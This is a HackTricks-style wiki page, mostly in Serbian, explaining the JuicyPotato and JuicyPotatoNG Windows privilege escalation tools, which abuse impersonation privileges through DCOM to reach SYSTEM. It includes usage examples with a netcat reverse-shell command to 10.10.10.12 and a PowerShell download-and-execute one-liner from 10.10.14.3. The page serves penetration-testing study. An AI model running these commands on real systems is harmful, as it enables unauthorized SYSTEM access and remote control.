# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato je zastareo. Generalno radi na Windows verzijama do Windows 10 1803 / Windows Server 2016. Microsoftove izmene uvedene počevši od Windows 10 1809 / Server 2019 polomile su originalnu tehniku. Za te build-ove i novije, razmotrite modernije alternative kao što su PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato i druge. Pogledajte stranicu ispod za ažurne opcije i upotrebu.


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (abusing the golden privileges) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Zaslađena verzija_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, sa malo “juice”-a, tj. **još jedan Local Privilege Escalation tool, koji omogućava eskalaciju iz Windows Service Accounts na NT AUTHORITY\SYSTEM**_

#### You can download juicypotato from [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Compatibility quick notes

- Pouzdano radi do Windows 10 1803 i Windows Server 2016 kada trenutni kontekst ima SeImpersonatePrivilege ili SeAssignPrimaryTokenPrivilege.
- Polomljeno promenama hardening-a koje je Microsoft uveo u Windows 10 1809 / Windows Server 2019 i kasnije. Za te build-ove preferirajte alternative povezane iznad.

### Summary <a href="#summary" id="summary"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) i njegove [varijante](https://github.com/decoder-it/lonelypotato) iskorišćavaju lanac eskalacije privilegija zasnovan na [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) koji ima MiTM listener na `127.0.0.1:6666` kada imate SeImpersonate ili SeAssignPrimaryToken privilegije. Tokom pregleda build-a Windows-a otkrili smo setup gde je `BITS` namerno onemogućen i port `6666` bio zauzet.

Odlučili smo da weaponizujemo [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Upoznajte Juicy Potato**.

> Za teoriju, pogledajte [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) i pratite lanac linkova i referenci.

Otkrili smo da, pored `BITS`, postoji nekoliko COM servera koje možemo zloupotrebiti. Oni samo moraju:

1. biti instancirani od strane trenutnog user-a, obično “service user” koji ima impersonation privilegije
2. implementirati `IMarshal` interfejs
3. raditi kao elevovan user (SYSTEM, Administrator, …)

Nakon testiranja dobili smo i testirali opsežnu listu [interesting CLSID’s](http://ohpe.it/juicy-potato/CLSID/) na nekoliko Windows verzija.

### Juicy details <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato vam omogućava:

- **Target CLSID** _izaberite bilo koji CLSID koji želite._ [_Here_](http://ohpe.it/juicy-potato/CLSID/) _možete pronaći listu organizovanu po OS-u._
- **COM Listening port** _definišite COM listening port koji preferirate (umesto hardkodovanog 6666)_
- **COM Listening IP address** _vežite server na bilo koji IP_
- **Process creation mode** _u zavisnosti od privilegija impersoniranog user-a možete birati između:_
- `CreateProcessWithToken` (zahteva `SeImpersonate`)
- `CreateProcessAsUser` (zahteva `SeAssignPrimaryToken`)
- `both`
- **Process to launch** _pokrenite izvršni fajl ili skriptu ako eksploatacija uspe_
- **Process Argument** _prilagodite argumente pokrenutog procesa_
- **RPC Server address** _za stealth pristup možete da se autentifikujete prema eksternom RPC serveru_
- **RPC Server port** _korisno ako želite da se autentifikujete prema eksternom serveru a firewall blokira port `135`…_
- **TEST mode** _uglavnom za testiranje, npr. testiranje CLSID-ova. Kreira DCOM i štampa user token-a. Pogledajte_ [_here for testing_](http://ohpe.it/juicy-potato/Test/)

### Usage <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Final thoughts <a href="#final-thoughts" id="final-thoughts"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

Ako korisnik ima `SeImpersonate` ili `SeAssignPrimaryToken` privilegije, onda ste **SYSTEM**.

Gotovo je nemoguće sprečiti zloupotrebu svih ovih COM Servers. Možete razmisliti o izmeni dozvola za ove objekte putem `DCOMCNFG`, ali srećno — biće izazovno.

Pravo rešenje je zaštititi osetljive naloge i aplikacije koje rade pod `* SERVICE` nalozima. Zaustavljanje `DCOM` sigurno bi omelo ovaj exploit, ali bi moglo imati ozbiljan uticaj na osnovni OS.

From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## JuicyPotatoNG (2022+)

JuicyPotatoNG ponovo uvodi JuicyPotato-stil local privilege escalation na modernim Windows sistemima kombinovanjem:
- DCOM OXID resolution to a local RPC server on a chosen port, avoiding the old hardcoded 127.0.0.1:6666 listener.
- An SSPI hook to capture and impersonate the inbound SYSTEM authentication without requiring RpcImpersonateClient, which also enables CreateProcessAsUser when only SeAssignPrimaryTokenPrivilege is present.
- Trikovi da zadovolje DCOM activation constraints (e.g., the former INTERACTIVE-group requirement when targeting PrintNotify / ActiveX Installer Service classes).

Important notes (evolving behavior across builds):
- September 2022: Početna tehnika je radila na podržanim Windows 10/11 i Server ciljevima koristeći “INTERACTIVE trick”.
- January 2023 update from the authors: Microsoft je kasnije blokirao INTERACTIVE trick. Drugi CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) ponovo omogućava exploit, ali samo na Windows 11 / Server 2022 prema njihovom postu.

Basic usage (more flags in the help):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
Ako ciljate Windows 10 1809 / Server 2019 gde je classic JuicyPotato ispravljen, koristite alternative navedene na vrhu (RoguePotato, PrintSpoofer, EfsPotato/GodPotato, itd.). NG može biti situacioni u zavisnosti od build-a i stanja servisa.

## Primeri

Napomena: Posetite [this page](https://ohpe.it/juicy-potato/CLSID/) za listu CLSIDs koje možete isprobati.

### Nabavite nc.exe reverse shell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Pokreni novi CMD (ako imaš RDP pristup)

![](<../../images/image (300).png>)

## Problemi sa CLSID

Često podrazumevani CLSID koji JuicyPotato koristi **ne radi** i exploit ne uspe. Obično je potrebno više pokušaja da se pronađe **radni CLSID**. Da biste dobili listu CLSID-ova koje treba probati za određeni operativni sistem, posetite ovu stranicu:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **Provera CLSID-ova**

Prvo će vam trebati neki izvršni fajlovi osim juicypotato.exe.

Preuzmite [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) i učitajte ga u vašu PS sesiju, zatim preuzmite i izvršite [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Taj skript će napraviti listu mogućih CLSID-ova za testiranje.

Zatim preuzmite [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(promenite putanju do liste CLSID-ova i do juicypotato izvršne datoteke) i pokrenite ga. Počeće da pokušava svaki CLSID, i **kada se broj porta promeni, to znači da je CLSID funkcionisao**.

**Proverite** radne CLSID-ove **koristeći parametar -c**

## References

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)

{{#include ../../banners/hacktricks-training.md}}
